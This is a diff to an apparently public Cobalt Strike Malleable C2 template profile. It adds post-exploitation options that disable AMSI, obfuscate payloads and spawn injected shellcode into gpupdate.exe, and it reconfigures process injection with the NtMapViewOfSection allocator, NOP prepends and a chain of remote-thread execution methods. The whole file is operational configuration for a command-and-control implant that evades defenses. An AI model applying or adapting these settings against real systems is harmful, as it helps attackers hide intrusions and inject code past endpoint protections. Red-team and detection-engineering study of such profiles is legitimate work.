@@ -1,5 +1,5 @@
-#template profile
-#options from https://www.cobaltstrike.com/help-malleable-c2
+#template profile - updated with 3.14 options
+#options from https://www.cobaltstrike.com/help-malleable-c2 and https://www.cobaltstrike.com/help-malleable-postex
 #attempt to get everything in one place with examples.
 #xx0hcd
 
@@ -60,6 +60,8 @@ http-config {
     header "Connection" "close";
     header "Cache-Control" "max-age=2";
     header "Server" "nginx";
+    #set "true" if teamserver is behind redirector
+    set trust_x_forwarded_for "false";
 }
 
 #the client GET function checks if there are tasks queued.
@@ -230,10 +232,10 @@ http-stager {
     set uri_x64 "/console";
 
     client {
-	header "Host" "whatever.com";
-	header "Accept" "*/*";
-	header "Accept-Language" "en-US";
-	header "Connection" "close";
+        header "Host" "whatever.com";
+        header "Accept" "*/*";
+        header "Accept-Language" "en-US";
+        header "Connection" "close";
     }
 
     server {
@@ -250,12 +252,18 @@ http-stager {
 
 ###Malleable PE Options###
 
-#Sets the default program to open and inject shellcode into.
-set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
-set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+post-ex {
 
-#attempt to disable amsi for execute-assembly, powerpick, and psinject.
-set amsi_disable "true";
+    set spawnto_x86 "%windir%\\syswow64\\gpupdate.exe";
+    set spawnto_x64 "%windir%\\sysnative\\gpupdate.exe";
+
+    set obfuscate "true";
+
+    set smartinject "true";
+
+    set amsi_disable "true";
+
+}
 
 #use peclone on the dll you want to use, this example uses wwanmm.dll. You can also set the values manually.
 #don't use 'set image_size_xx' if using 'set module_xx'. During testing it seemed to double the size of my payload causing module stomp to fail, need to test it out more though.
@@ -305,28 +313,30 @@ stage {
     stringw "something"; 
 }
 
+
 #controls process injection behavior
 process-inject {
-        set min_alloc "16700";
+
+    set allocator "NtMapViewOfSection";		
+
+    set min_alloc "16700";
+
+    set userwx "false";  
     
-        set startrwx "true";
-        set userwx "false";
+    set startrwx "true";
+        
+    transform-x86 {
+        prepend "\x90\x90\x90";
+    }
+    transform-x64 {
+        prepend "\x90\x90\x90";
+    }
 
-        transform-x86 {
-            prepend "\x90\x90\x90";
-        }
-        transform-x64 {
-            prepend "\x90\x90\x90";
-        }
-
-#disable can cause some beacon issues
-        #no c2lint warning...
-        disable "SetThreadContext";
-
-        #c2lint warning ".process-inject disables several functions. As a result: x86 -> x86 injection will fail."
-        #disable "CreateRemoteThread";
-
-        #c2lint warning ".process-inject disables several functions. As a result: x86 -> x64 injection will fail."
-        #disable "RtlCreateUserThread";
+    execute {
+        CreateThread "ntdll!RtlUserThreadStart";
+        CreateThread;
+        NtQueueApcThread;
+        CreateRemoteThread;
+        RtlCreateUserThread;
+    }
 }    
-
